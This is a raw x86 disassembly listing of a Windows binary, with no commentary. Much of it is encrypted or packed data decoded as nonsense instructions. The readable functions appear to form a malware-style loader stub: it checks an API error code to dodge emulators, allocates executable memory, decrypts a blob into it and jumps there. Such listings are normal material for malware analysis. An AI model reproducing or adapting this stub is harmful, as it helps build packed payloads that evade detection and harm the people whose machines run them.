  42139e:	xchg   esp,eax
  42139f:	enter  0x7dc3,0x2c
  4213a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213a4:	add    ebx,DWORD PTR [edi+esi*2+0x13763af]
  4213ab:	mov    ebx,0x43c68fbb
  4213b0:	add    al,0x11
  4213b2:	xchg   DWORD PTR [edx+0x68],ebp
  4213b5:	or     BYTE PTR [edi+0x4a],ah
  4213b8:	pop    ss
  4213b9:	jo     0x42133c
  4213bb:	or     esp,DWORD PTR ds:0xb15e5815
  4213c1:	sbb    BYTE PTR [ebx],0x6f
  4213c4:	outs   dx,DWORD PTR ds:[esi]
  4213c5:	jo     0x421408
  4213c7:	adc    DWORD PTR [eax+eax*2],ecx
  4213ca:	add    bl,dl
  4213cc:	cdq    
  4213cd:	add    DWORD PTR [edx],edi
  4213cf:	fdiv   DWORD PTR [edx]
  4213d1:	adc    BYTE PTR [eax+edi*1+0x9],0xee
  4213d6:	jb     0x421382
  4213d8:	outs   dx,DWORD PTR ds:[esi]
  4213d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213da:	lods   eax,DWORD PTR ds:[esi]
  4213db:	mov    edx,0xc2dab5bc
  4213e0:	pop    ebx
  4213e1:	hlt    
  4213e2:	xchg   edx,eax
  4213e3:	jb     0x4213fb
  4213e5:	inc    ecx
  4213e6:	nop
  4213e7:	stc    
  4213e8:	push   ecx
  4213e9:	data16 loop 0x421375
  4213ec:	jmp    0x4213ef
  4213ee:	sub    dl,BYTE PTR [ebx+edi*4]
  4213f1:	rol    BYTE PTR [ebx+eiz*4-0x11],1
  4213f5:	aad    0x47
  4213f7:	scas   eax,DWORD PTR es:[edi]
  4213f8:	aad    0x40
  4213fa:	mov    ds,esi
  4213fc:	cmp    edx,DWORD PTR [esi-0x37265b1]
  421402:	mov    edi,0x294ac8ec
  421407:	mov    esi,0x222e4f37
  42140c:	sub    DWORD PTR [esi-0x7c],edx
  42140f:	sar    BYTE PTR [eax],cl
  421411:	add    bl,dl
  421413:	mov    cl,0x0
  421415:	mov    ds:0xd9822660,al
  42141a:	mov    edi,0xdcab053
  42141f:	cmp    al,0xf2
  421421:	inc    esi
  421422:	adc    eax,0x96b52cc9
  421427:	jl     0x4213d0
  421429:	leave  
  42142a:	jo     0x4214a2
  42142c:	call   0xe5af:0x4fd29cea
  421433:	adc    bh,BYTE PTR [edi]
  421435:	stc    
  421436:	call   0xb2b2:0x4d917a49
  42143d:	jecxz  0x4214b7
  42143f:	addr16 mov fs,ebp
  421442:	sub    DWORD PTR [ecx+0x27c5b9e7],ebx
  421448:	push   esi
  421449:	test   al,0xc
  42144b:	cmp    BYTE PTR [edx+0x3717f3e0],0x4e
  421452:	jg     0x42141d
  421454:	cmp    al,0xe7
  421456:	sahf   
  421457:	cmp    al,0x2d
  421459:	adc    eax,0xda80873f
  42145e:	outs   dx,BYTE PTR ds:[esi]
  42145f:	pop    ebp
  421460:	mov    esi,0x3ede4cac
  421465:	mov    fs,WORD PTR ds:0x70eb0483
  42146b:	retf   0xc1f5
  42146e:	iret   
  42146f:	(bad)  
  421470:	(bad)  
  421471:	es adc eax,0xb839ddf5
  421477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421478:	mov    ss,ecx
  42147a:	push   0xfffffff6
  42147c:	mov    ecx,0x27c41cc7
  421481:	loope  0x421424
  421483:	pop    esi
  421484:	or     al,0xe
  421486:	inc    esi
  421487:	je     0x421499
  421489:	mov    al,0x6b
  42148b:	sbb    al,0x3c
  42148d:	inc    edx
  42148e:	jno    0x42142c
  421490:	scas   al,BYTE PTR es:[edi]
  421491:	lods   eax,DWORD PTR ds:[esi]
  421492:	add    BYTE PTR ds:0x8feb2670,al
  421498:	ret    0xb748
  42149b:	sbb    DWORD PTR [ecx+0xe],edx
  42149e:	push   edi
  42149f:	fcmovb st,st(6)
  4214a1:	inc    edi
  4214a2:	xchg   esi,eax
  4214a3:	ror    BYTE PTR [esi],cl
  4214a5:	out    0xff,eax
  4214a7:	xchg   ebx,eax
  4214a8:	add    DWORD PTR [edx-0x57],eax
  4214ab:	aam    0x54
  4214ad:	xchg   ecx,eax
  4214ae:	xchg   ecx,eax
  4214af:	mov    dh,0xcc
  4214b1:	popf   
  4214b2:	xor    ebp,edx
  4214b4:	call   0xa130:0x8ed25fc4
  4214bb:	xor    dl,BYTE PTR [edi]
  4214bd:	inc    edi
  4214be:	push   eax
  4214bf:	jb     0x421494
  4214c1:	push   0xffffffc5
  4214c3:	je     0x421510
  4214c5:	cdq    
  4214c6:	mov    esp,0xb0b1e69c
  4214cb:	add    DWORD PTR [edi-0x41],eax
  4214ce:	into   
  4214cf:	push   esi
  4214d0:	retf   0xac67
  4214d3:	xchg   edi,eax
  4214d4:	(bad)  
  4214d5:	or     ecx,esi
  4214d7:	mov    bl,BYTE PTR [edi-0x910ba41]
  4214dd:	aad    0xe3
  4214df:	pop    ecx
  4214e0:	rol    bl,cl
  4214e2:	stos   BYTE PTR es:[edi],al
  4214e3:	mov    ebp,0x699eb4f7
  4214e8:	inc    edx
  4214e9:	mov    bh,0x28
  4214eb:	ins    DWORD PTR es:[edi],dx
  4214ec:	sar    DWORD PTR [ecx],0xf
  4214ef:	push   0x1b
  4214f1:	in     al,0x6
  4214f3:	int    0xd6
  4214f5:	outs   dx,DWORD PTR ds:[esi]
  4214f6:	rcr    DWORD PTR [ebp-0x6c61d900],cl
  4214fc:	or     eax,0x6cdd8a70
  421501:	into   
  421502:	inc    ebp
  421503:	mov    eax,ds:0xf204e15a
  421508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421509:	jno    0x4214b0
  42150b:	out    dx,al
  42150c:	pop    edx
  42150d:	ins    BYTE PTR es:[edi],dx
  42150e:	inc    eax
  42150f:	add    ecx,DWORD PTR [ebx-0x6b]
  421512:	xor    BYTE PTR [eax-0x753e7008],bh
  421518:	or     eax,0x94314fb5
  42151d:	push   edi
  42151e:	mov    edx,ds
  421520:	out    dx,al
  421521:	addr16 aad 0x86
  421524:	xchg   esp,eax
  421525:	mov    ds:0x3eff44b6,eax
  42152a:	mov    ebx,0x13c3793f
  42152f:	adc    bl,BYTE PTR ds:0x63330f31
  421535:	call   0xcad1:0xa13930b6
  42153c:	rcl    DWORD PTR [ebx*4-0x4563f312],1
  421543:	pop    esi
  421544:	pop    ebp
  421545:	pop    ecx
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x10],0x0
  421565:	mov    DWORD PTR [ebp-0x18],0x0
  42156c:	mov    DWORD PTR [ebp-0x78],0x0
  421573:	mov    DWORD PTR [ebp-0x60],0x0
  42157a:	mov    DWORD PTR [ebp-0x5c],0x0
  421581:	mov    DWORD PTR [ebp-0x74],0x0
  421588:	mov    DWORD PTR [ebp-0x64],0x0
  42158f:	mov    DWORD PTR [ebp-0x8],0x0
  421596:	mov    DWORD PTR [ebp-0x68],0x0
  42159d:	mov    DWORD PTR [ebp-0x30],0x0
  4215a4:	mov    DWORD PTR [ebp-0x70],0x0
  4215ab:	mov    DWORD PTR [ebp-0x58],0x0
  4215b2:	mov    DWORD PTR [ebp-0x54],0x0
  4215b9:	mov    DWORD PTR [ebp-0x4],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x14],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428158
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42815c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428160
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428164
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x428148
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x42814c
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428150
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428154
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428156
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	call   DWORD PTR ds:0x428018
  421632:	lea    eax,[ebp-0x10]
  421635:	push   eax
  421636:	lea    ecx,[ebp-0x10]
  421639:	push   ecx
  42163a:	lea    edx,[ebp-0x18]
  42163d:	push   edx
  42163e:	call   DWORD PTR ds:0x428004
  421644:	test   eax,eax
  421646:	je     0x421651
  421648:	mov    eax,DWORD PTR [ebp-0x10]
  42164b:	add    eax,0x1
  42164e:	mov    DWORD PTR [ebp-0x10],eax
  421651:	mov    DWORD PTR [ebp-0x48],0x0
  421658:	mov    DWORD PTR [ebp-0x4c],0x0
  42165f:	lea    ecx,[ebp-0x18]
  421662:	push   ecx
  421663:	call   DWORD PTR ds:0x428000
  421669:	mov    BYTE PTR [ebp-0x40],0x56
  42166d:	call   DWORD PTR ds:0x428034
  421673:	mov    DWORD PTR [ebp-0x2c],eax
  421676:	mov    BYTE PTR [ebp-0x3e],0x72
  42167a:	movzx  edx,WORD PTR [ebp-0x2c]
  42167e:	test   edx,edx
  421680:	jne    0x4216d0
  421682:	mov    BYTE PTR [ebp-0x34],0x0
  421686:	mov    DWORD PTR [ebp-0x18],0xe0d
  42168d:	lea    eax,[ebp-0x28]
  421690:	push   eax
  421691:	call   DWORD PTR ds:0x428044
  421697:	mov    DWORD PTR [ebp-0x68],eax
  42169a:	mov    DWORD PTR [ebp-0x5c],0x3a
  4216a1:	lea    ecx,[ebp-0x40]
  4216a4:	push   ecx
  4216a5:	mov    edx,DWORD PTR [ebp-0x68]
  4216a8:	push   edx
  4216a9:	call   DWORD PTR ds:0x42804c
  4216af:	mov    DWORD PTR [ebp-0x44],eax
  4216b2:	mov    DWORD PTR [ebp-0x8],0xfc016ae5
  4216b9:	mov    eax,DWORD PTR [ebp-0x68]
  4216bc:	push   eax
  4216bd:	mov    ecx,DWORD PTR [ebp-0x70]
  4216c0:	push   ecx
  4216c1:	call   DWORD PTR ds:0x428138
  4216c7:	mov    DWORD PTR [ebp-0x74],0x10e747
  4216ce:	jmp    0x4216e5
  4216d0:	mov    BYTE PTR ds:0x4476e0,0x0
  4216d7:	mov    BYTE PTR ds:0x42be60,0x0
  4216de:	mov    BYTE PTR ds:0x443920,0x0
  4216e5:	push   DWORD PTR ds:0x428044
  4216eb:	pop    edx
  4216ec:	mov    DWORD PTR [ebp-0x78],edx
  4216ef:	mov    edx,DWORD PTR [ebp-0x68]
  4216f2:	push   edx
  4216f3:	call   DWORD PTR ds:0x428048
  4216f9:	mov    eax,DWORD PTR [ebp-0x70]
  4216fc:	push   eax
  4216fd:	call   DWORD PTR ds:0x428050
  421703:	mov    DWORD PTR [ebp-0x2c],0x410000
  42170a:	push   DWORD PTR [ebp-0x30]
  42170d:	push   0x1000
  421712:	mov    eax,DWORD PTR [ebp-0x18]
  421715:	add    eax,0x23
  421718:	add    eax,0x23
  42171b:	push   eax
  42171c:	xor    eax,eax
  42171e:	push   eax
  42171f:	mov    ecx,DWORD PTR [ebp-0x44]
  421722:	call   ecx
  421724:	mov    edx,eax
  421726:	mov    DWORD PTR [ebp-0x4],edx
  421729:	mov    ecx,DWORD PTR [ebp-0x74]
  42172c:	sub    ecx,0xdae0b
  421732:	mov    DWORD PTR [ebp-0x74],ecx
  421735:	cmp    DWORD PTR [ebp-0x4],0x0
  421739:	jne    0x42174e
  42173b:	push   0xa
  42173d:	mov    edx,DWORD PTR [ebp-0x68]
  421740:	push   edx
  421741:	call   DWORD PTR ds:0x428058
  421747:	mov    BYTE PTR ds:0x443920,0x0
  42174e:	mov    eax,DWORD PTR [ebp-0x4]
  421751:	add    eax,DWORD PTR [ebp-0x18]
  421754:	mov    ecx,DWORD PTR [ebp-0x8]
  421757:	mov    DWORD PTR [eax],ecx
  421759:	mov    edx,DWORD PTR [ebp-0x4]
  42175c:	add    edx,DWORD PTR [ebp-0x5c]
  42175f:	mov    DWORD PTR [ebp-0x64],edx
  421762:	mov    eax,ds:0x42804c
  421767:	mov    DWORD PTR [ebp-0x54],eax
  42176a:	mov    ecx,DWORD PTR [ebp-0x4]
  42176d:	add    ecx,DWORD PTR [ebp-0x18]
  421770:	mov    edx,DWORD PTR [ebp+0x8]
  421773:	mov    DWORD PTR [ecx+0x4],edx
  421776:	mov    eax,DWORD PTR [ebp-0x4]
  421779:	add    eax,DWORD PTR [ebp-0x18]
  42177c:	mov    DWORD PTR [ebp-0xc],eax
  42177f:	push   0x0
  421781:	push   0x14
  421783:	push   0x14
  421785:	push   0xa
  421787:	push   0xa
  421789:	push   0x0
  42178b:	call   DWORD PTR ds:0x428010
  421791:	cmp    DWORD PTR [ebp-0x74],0x0
  421795:	jbe    0x4217b2
  421797:	mov    ecx,DWORD PTR [ebp-0xc]
  42179a:	push   ecx
  42179b:	mov    edx,DWORD PTR [ebp-0x18]
  42179e:	push   edx
  42179f:	mov    eax,DWORD PTR [ebp-0x2c]
  4217a2:	add    eax,DWORD PTR [ebp-0x74]
  4217a5:	push   eax
  4217a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4217a9:	push   ecx
  4217aa:	call   0x411000
  4217af:	add    esp,0x10
  4217b2:	cmp    DWORD PTR [ebp-0x64],0x0
  4217b6:	je     0x4217ca
  4217b8:	mov    ecx,DWORD PTR [ebp-0x54]
  4217bb:	push   ecx
  4217bc:	push   DWORD PTR [ebp-0x78]
  4217bf:	mov    esi,DWORD PTR [ebp-0x64]
  4217c2:	push   edx
  4217c3:	pop    eax
  4217c4:	push   ecx
  4217c5:	nop
  4217c6:	jmp    esi
  4217c8:	jmp    0x4217dc
  4217ca:	mov    edx,DWORD PTR [ebp+0x8]
  4217cd:	mov    DWORD PTR [ebp-0x14],edx
  4217d0:	push   0x0
  4217d2:	mov    eax,DWORD PTR [ebp-0x68]
  4217d5:	push   eax
  4217d6:	call   DWORD PTR ds:0x42800c
  4217dc:	mov    eax,0x1
  4217e1:	pop    esi
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    
  4217e6:	int3   
  4217e7:	int3   
  4217e8:	int3   
  4217e9:	int3   
  4217ea:	int3   
  4217eb:	int3   
  4217ec:	int3   
  4217ed:	int3   
  4217ee:	int3   
  4217ef:	int3   
  4217f0:	push   ebp
  4217f1:	mov    ebp,esp
  4217f3:	sub    esp,0x8
  4217f6:	push   esi
  4217f7:	push   0x0
  4217f9:	push   0x0
  4217fb:	mov    DWORD PTR [ebp-0x4],0x0
  421802:	call   DWORD PTR ds:0x428138
  421808:	mov    esi,DWORD PTR ds:0x428034
  42180e:	push   0x0
  421810:	push   0x0
  421812:	push   0x0
  421814:	push   0x0
  421816:	mov    DWORD PTR [ebp-0x8],esi
  421819:	call   DWORD PTR ds:0x42802c
  42181f:	test   esi,esi
  421821:	jne    0x42182a
  421823:	push   esi
  421824:	call   DWORD PTR ds:0x428028
  42182a:	push   0x0
  42182c:	push   0x4e
  42182e:	push   0x1e
  421830:	push   0x0
  421832:	push   0xffffffff
  421834:	call   DWORD PTR ds:0x428024
  42183a:	mov    esi,DWORD PTR [ebp-0x8]
  42183d:	call   esi
  42183f:	mov    DWORD PTR [ebp-0x4],eax
  421842:	cmp    DWORD PTR [ebp-0x4],0x57
  421846:	jne    0x42185d
  421848:	push   0xb2b713a4
  42184d:	call   0x421550
  421852:	add    esp,0x4
  421855:	push   0x0
  421857:	call   DWORD PTR ds:0x428020
  42185d:	push   0x0
  42185f:	push   0x0
  421861:	push   0x100000
  421866:	call   DWORD PTR ds:0x42801c
  42186c:	xor    eax,eax
  42186e:	pop    esi
  42186f:	mov    esp,ebp
  421871:	pop    ebp
  421872:	ret    
  421873:	nop
  421874:	nop
  421875:	nop
  421876:	nop
  421877:	nop
  421878:	nop
  421879:	nop
  42187a:	nop
  42187b:	nop
  42187c:	nop
  42187d:	nop
  42187e:	nop
  42187f:	nop
  421880:	sub    esp,0x10
  421883:	push   0x0
  421885:	push   0x0
  421887:	push   0x0
  421889:	call   0x422a10
  42188e:	push   0x0
  421890:	call   DWORD PTR ds:0x428040
  421896:	lea    eax,[esp+0x0]
  42189a:	push   eax
  42189b:	call   DWORD PTR ds:0x42803c
  4218a1:	call   DWORD PTR ds:0x428038
  4218a7:	cmp    WORD PTR [esp+0x0],0x0
  4218ad:	je     0x4218c6
  4218af:	push   0x0
  4218b1:	call   DWORD PTR ds:0x428054
  4218b7:	push   0x0
  4218b9:	call   0x4217f0
  4218be:	add    esp,0x4
  4218c1:	jmp    0x4229f3
  4218c6:	push   DWORD PTR ds:0xcef79d01
  4218cc:	xor    dh,dh
  4218ce:	out    0xcd,eax
  4218d0:	aas    
  4218d1:	neg    al
  4218d3:	mov    edx,0x4f0d5b87
  4218d8:	int    0x30
  4218da:	mul    bh
  4218dc:	leave  
  4218dd:	aas    
  4218de:	neg    BYTE PTR [eax+0xd5b7845]
  4218e4:	test   ebp,0xc9e7f630
  4218ea:	aas    
  4218eb:	neg    al
  4218ed:	inc    ebp
  4218ee:	js     0x42194b
  4218f0:	or     eax,0xf630cdf7
  4218f5:	out    0xc9,eax
  4218f7:	aas    
  4218f8:	neg    al
  4218fa:	inc    ebp
  4218fb:	js     0x421958
  4218fd:	or     eax,0xf630cdf7
  421902:	out    0x31,eax
  421904:	aas    
  421905:	neg    al
  421907:	dec    ebx
  421908:	addr16 loope 0x42190e
  42190b:	idiv   DWORD PTR [ecx+0x39]
  42190e:	cmp    eax,esi
  421910:	jno    0x421950
  421912:	mov    edx,0x332c6415
  421917:	fs test ch,ch
  42191a:	inc    eax
  42191b:	test   BYTE PTR [eax-0x4a68b252],cl
  421921:	sbb    edi,DWORD PTR gs:[edx]
  421924:	arpl   WORD PTR [ecx-0x7a29bb5e],bx
  42192a:	lods   al,BYTE PTR ds:[esi]
  42192b:	pop    ds
  42192c:	test   BYTE PTR [ebp+0x6332582b],ch
  421932:	xlat   BYTE PTR ds:[ebx]
  421933:	mov    DWORD PTR [edi-0x5b],edi
  421936:	(bad)  
  421937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421938:	push   eax
  421939:	xchg   edx,eax
  42193a:	mov    ebp,0x756756b
  42193f:	ror    ebp,cl
  421941:	xor    dh,dh
  421943:	out    0xc9,eax
  421945:	aas    
  421946:	neg    bh
  421948:	fadd   QWORD PTR [edx+eax*1+0x3a5f0f4e]
  42194f:	mov    ch,0x1f
  421951:	pop    ebx
  421952:	xor    eax,0x72d720b5
  421957:	add    ebp,DWORD PTR [eax-0x5]
  42195a:	(bad)  
  42195b:	outs   dx,DWORD PTR ds:[esi]
  42195c:	push   cs
  42195d:	jne    0x421922
  42195f:	addr16 xchg ebx,eax
  421961:	loopne 0x4219b2
  421963:	mov    edx,0x95fd9fa3
  421968:	push   ebp
  421969:	iret   
  42196a:	in     eax,dx
  42196b:	mov    eax,ds:0x69d264c7
  421970:	mul    BYTE PTR [edx+0x7]
  421973:	mov    cl,0x35
  421975:	mov    ds:0x2e49adfc,al
  42197a:	cld    
  42197b:	xchg   edx,eax
  42197c:	mov    ebp,0x774751ea
  421981:	int3   
  421982:	cmp    ch,BYTE PTR [esi-0x4acaa4e1]
  421988:	and    dh,dl
  42198a:	jb     0x4219ff
  42198c:	hlt    
  42198d:	gs (bad) 
  42198f:	(bad)  
  421990:	cs addr16 ret 
  421993:	jb     0x4219a3
  421995:	dec    edx
  421996:	dec    edi
  421997:	and    BYTE PTR [esi],bh
  421999:	xor    ch,bh
  42199b:	(bad)
  42199e:	in     eax,dx
  42199f:	xchg   ecx,eax
  4219a0:	pop    edx
  4219a1:	(bad)  
  4219a2:	rol    BYTE PTR [edi],cl
  4219a4:	or     cl,0x7
  4219a7:	scas   eax,DWORD PTR es:[edi]
  4219a8:	test   al,0x3f
  4219aa:	cld    
  4219ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219ac:	xor    DWORD PTR [ebp+0x1b2c8afc],ebp
  4219b2:	xor    ecx,DWORD PTR [esi+0xf]
  4219b5:	pop    edi
  4219b6:	cmp    dh,dh
  4219b8:	out    0xc9,eax
  4219ba:	aas    
  4219bb:	neg    al
  4219bd:	inc    ebp
  4219be:	js     0x4219cb
  4219c0:	dec    eax
  4219c1:	test   ebp,0xc9e5f77c
  4219c7:	rcl    DWORD PTR ds:0x5b780a87,cl
  4219cd:	or     eax,0xf630cdf7
  4219d2:	out    0x29,eax
  4219d4:	aas    
  4219d5:	cmc    
  4219d6:	(bad)  [esi+0x79]
  4219d9:	push   ecx
  4219da:	or     eax,0xf63421f7
  4219df:	out    0xcd,eax
  4219e1:	cmp    esi,esi
  4219e3:	fadd   DWORD PTR [ebp+0x78]
  4219e6:	pop    ebx
  4219e7:	or     al,0x4a
  4219e9:	int    0x30
  4219eb:	div    bh
  4219ed:	leave  
  4219ee:	aas    
  4219ef:	neg    al
  4219f1:	inc    eax
  4219f2:	js     0x421a4f
  4219f4:	or     eax,0xe630cdb6
  4219f9:	out    0xc9,eax
  4219fb:	aas    
  4219fc:	hlt    
  4219fd:	fadd   DWORD PTR [ebp+0x7d]
  421a00:	pop    ebx
  421a01:	or     al,0xf7
  421a03:	int    0x30
  421a05:	mul    bh
  421a07:	int3   
  421a08:	aas    
  421a09:	neg    eax
  421a0b:	inc    ebp
  421a0c:	js     0x421a69
  421a0e:	or     eax,0xf63b4df7
  421a13:	out    0xcd,eax
  421a15:	aas    
  421a16:	mul    BYTE PTR [ebp+0x74]
  421a19:	jge    0x421a76
  421a1b:	maskmovq mm1,mm5
  421a1e:	mov    al,0xf6
  421a20:	out    0xd9,eax
  421a22:	aas    
  421a23:	test   al,0x45
  421a26:	js     0x421a83
  421a28:	or     eax,0xe630cde7
  421a2d:	out    0xc9,eax
  421a2f:	aas    
  421a30:	neg    al
  421a32:	inc    ebp
  421a33:	push   0xcdf70d5b
  421a38:	xor    dh,dh
  421a3a:	out    0xc9,eax
  421a3c:	aas    
  421a3d:	neg    al
  421a3f:	rcl    DWORD PTR [esi],0x50
  421a42:	or     eax,0xf630ce9e
  421a47:	out    0xf9,eax
  421a49:	xor    al,0xf6
  421a4b:	pop    ss
  421a4c:	js     0x421ac6
  421a4e:	pop    ebx
  421a4f:	or     eax,0xf630cdf7
  421a54:	out    0xc9,eax
  421a56:	aas    
  421a57:	neg    al
  421a59:	inc    ebp
  421a5a:	js     0x421ab7
  421a5c:	or     eax,0xf630cdf7
  421a61:	out    0xc9,eax
  421a63:	aas    
  421a64:	neg    al
  421a66:	inc    ebp
  421a67:	js     0x421ac4
  421a69:	or     eax,0xf630cdf7
  421a6e:	out    0xc9,eax
  421a70:	aas    
  421a71:	neg    al
  421a73:	inc    ebp
  421a74:	js     0x421ad1
  421a76:	or     eax,0xf630cdf7
  421a7b:	out    0xc9,eax
  421a7d:	aas    
  421a7e:	neg    al
  421a80:	inc    ebp
  421a81:	js     0x421ade
  421a83:	or     eax,0xf630cdf7
  421a88:	out    0xc9,eax
  421a8a:	aas    
  421a8b:	neg    al
  421a8d:	inc    ebp
  421a8e:	js     0x421aeb
  421a90:	or     eax,0xf630cdf7
  421a95:	out    0xc9,eax
  421a97:	aas    
  421a98:	neg    al
  421a9a:	inc    ebp
  421a9b:	js     0x421af8
  421a9d:	or     eax,0xf630cdf7
  421aa2:	out    0xc9,eax
  421aa4:	aas    
  421aa5:	neg    al
  421aa7:	inc    ebp
  421aa8:	js     0x421b05
  421aaa:	or     eax,0xf630cdf7
  421aaf:	out    0xc9,eax
  421ab1:	aas    
  421ab2:	neg    al
  421ab4:	inc    ebp
  421ab5:	js     0x421b12
  421ab7:	and    eax,DWORD PTR [ebx-0x187db758]
  421abd:	leave  
  421abe:	aas    
  421abf:	idiv   al
  421ac1:	dec    esi
  421ac2:	js     0x421b1f
  421ac4:	sbb    eax,0xcc30cdf7
  421ac9:	jecxz  0x421a94
  421acb:	aas    
  421acc:	repnz fadd DWORD PTR [ebp+0x28]
  421ad0:	push   ds
  421ad1:	dec    esi
  421ad2:	lds    ebx,FWORD PTR [ecx-0x36180981]
  421ad8:	aas    
  421ad9:	neg    al
  421adb:	gs js  0x421b39
  421ade:	in     eax,dx
  421adf:	fnstcw WORD PTR [edi-0x367b7bbd]
  421ae5:	aas    
  421ae6:	neg    al
  421ae8:	adc    eax,0xc70d5b78
  421aed:	(bad)  
  421aee:	xor    dh,dh
  421af0:	mov    bh,0xc9
  421af2:	aas    
  421af3:	mul    dh
  421af5:	inc    ecx
  421af6:	js     0x421b53
  421af8:	or     eax,0xf630cdf7
  421afd:	out    0xc9,eax
  421aff:	aas    
  421b00:	neg    al
  421b02:	inc    ebp
  421b03:	pop    eax
  421b04:	pop    ebx
  421b05:	or     eax,0xf630cd17
  421b0a:	out    0xc9,eax
  421b0c:	aas    
  421b0d:	neg    al
  421b0f:	inc    ebp
  421b10:	js     0x421b6d
  421b12:	or     eax,0xf630cdf7
  421b17:	out    0xc9,eax
  421b19:	aas    
  421b1a:	neg    al
  421b1c:	inc    ebp
  421b1d:	js     0x421b7a
  421b1f:	or     eax,0xf630cdf7
  421b24:	out    0xc9,eax
  421b26:	aas    
  421b27:	neg    al
  421b29:	inc    ebp
  421b2a:	js     0x421b87
  421b2c:	or     eax,0xf630cdf7
  421b31:	out    0xc9,eax
  421b33:	aas    
  421b34:	neg    al
  421b36:	inc    ebp
  421b37:	js     0x421b94
  421b39:	or     eax,0xf630cdf7
  421b3e:	out    0xc9,eax
  421b40:	aas    
  421b41:	neg    al
  421b43:	inc    ebp
  421b44:	js     0x421ba1
  421b46:	or     eax,0xf630cdf7
  421b4b:	out    0xc9,eax
  421b4d:	aas    
  421b4e:	neg    al
  421b50:	inc    ebp
  421b51:	js     0x421bae
  421b53:	or     eax,0xf630cdf7
  421b58:	out    0xc9,eax
  421b5a:	aas    
  421b5b:	neg    al
  421b5d:	inc    ebp
  421b5e:	js     0x421bbb
  421b60:	or     eax,0xf630cdf7
  421b65:	out    0xc9,eax
  421b67:	aas    
  421b68:	neg    al
  421b6a:	inc    ebp
  421b6b:	js     0x421bc8
  421b6d:	or     eax,0xf630cdf7
  421b72:	out    0xc9,eax
  421b74:	aas    
  421b75:	neg    al
  421b77:	inc    ebp
  421b78:	js     0x421bd5
  421b7a:	or     eax,0xf630cdf7
  421b7f:	out    0xc9,eax
  421b81:	aas    
  421b82:	neg    al
  421b84:	inc    ebp
  421b85:	js     0x421be2
  421b87:	or     eax,0xf630cdf7
  421b8c:	out    0xc9,eax
  421b8e:	aas    
  421b8f:	neg    al
  421b91:	inc    ebp
  421b92:	js     0x421bef
  421b94:	or     eax,0xf630cdf7
  421b99:	out    0xc9,eax
  421b9b:	aas    
  421b9c:	neg    al
  421b9e:	inc    ebp
  421b9f:	js     0x421bfc
  421ba1:	or     eax,0xf630cdf7
  421ba6:	out    0xc9,eax
  421ba8:	aas    
  421ba9:	neg    al
  421bab:	inc    ebp
  421bac:	js     0x421c09
  421bae:	or     eax,0xf630cdf7
  421bb3:	out    0xc9,eax
  421bb5:	aas    
  421bb6:	neg    al
  421bb8:	inc    ebp
  421bb9:	js     0x421c16
  421bbb:	or     eax,0xf630cdf7
  421bc0:	out    0xc9,eax
  421bc2:	aas    
  421bc3:	neg    al
  421bc5:	inc    ebp
  421bc6:	js     0x421c23
  421bc8:	or     eax,0xf630cdf7
  421bcd:	out    0xc9,eax
  421bcf:	aas    
  421bd0:	neg    al
  421bd2:	inc    ebp
  421bd3:	js     0x421c30
  421bd5:	or     eax,0xf630cdf7
  421bda:	out    0xc9,eax
  421bdc:	aas    
  421bdd:	neg    al
  421bdf:	inc    ebp
  421be0:	js     0x421c3d
  421be2:	or     eax,0xf630cdf7
  421be7:	out    0xc9,eax
  421be9:	aas    
  421bea:	neg    al
  421bec:	inc    ebp
  421bed:	js     0x421c4a
  421bef:	or     eax,0xf630cdf7
  421bf4:	out    0xc9,eax
  421bf6:	aas    
  421bf7:	neg    al
  421bf9:	inc    ebp
  421bfa:	js     0x421c57
  421bfc:	or     eax,0xf630cdf7
  421c01:	out    0xc9,eax
  421c03:	aas    
  421c04:	neg    al
  421c06:	inc    ebp
  421c07:	js     0x421c64
  421c09:	or     eax,0xf630cdf7
  421c0e:	out    0xc9,eax
  421c10:	aas    
  421c11:	neg    al
  421c13:	inc    ebp
  421c14:	js     0x421c71
  421c16:	or     eax,0xf630cdf7
  421c1b:	out    0xc9,eax
  421c1d:	aas    
  421c1e:	neg    al
  421c20:	inc    ebp
  421c21:	js     0x421c7e
  421c23:	or     eax,0xf630cdf7
  421c28:	out    0xc9,eax
  421c2a:	aas    
  421c2b:	neg    al
  421c2d:	inc    ebp
  421c2e:	js     0x421c8b
  421c30:	or     eax,0xf630cdf7
  421c35:	out    0xc9,eax
  421c37:	aas    
  421c38:	neg    al
  421c3a:	inc    ebp
  421c3b:	js     0x421c98
  421c3d:	or     eax,0xf630cdf7
  421c42:	out    0xc9,eax
  421c44:	aas    
  421c45:	neg    al
  421c47:	inc    ebp
  421c48:	js     0x421ca5
  421c4a:	or     eax,0xf630cdf7
  421c4f:	out    0xc9,eax
  421c51:	aas    
  421c52:	neg    al
